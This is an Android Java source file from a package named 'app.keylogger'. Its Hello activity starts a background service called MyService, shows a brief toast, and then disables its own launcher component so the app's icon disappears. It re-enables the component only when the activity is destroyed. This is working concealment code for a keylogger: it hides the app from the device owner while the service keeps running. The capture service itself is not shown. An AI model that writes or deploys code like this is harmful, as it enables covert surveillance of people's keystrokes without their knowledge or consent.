package app.keylogger;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.widget.Toast;

public class Hello extends Activity {   
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
		Intent newIntent = new Intent(this.getApplicationContext(), MyService.class);
		getApplicationContext().startService(newIntent);
        Toast.makeText(getBaseContext(), "Hello.java onCreate", Toast.LENGTH_LONG).show();
        ComponentName componentToDisable =
        		  new ComponentName("app.keylogger",
        		  "app.keylogger.Hello");
        getPackageManager().setComponentEnabledSetting(
        		  componentToDisable,
        		  PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
        		  PackageManager.DONT_KILL_APP);
        finish();
    }
    public void onDestroy() {
        ComponentName componentToEnable =
        		  new ComponentName("app.keylogger",
        		  "app.keylogger.Hello");
        getPackageManager().setComponentEnabledSetting(
        		  componentToEnable,
        		  PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
        		  PackageManager.DONT_KILL_APP);
    }
}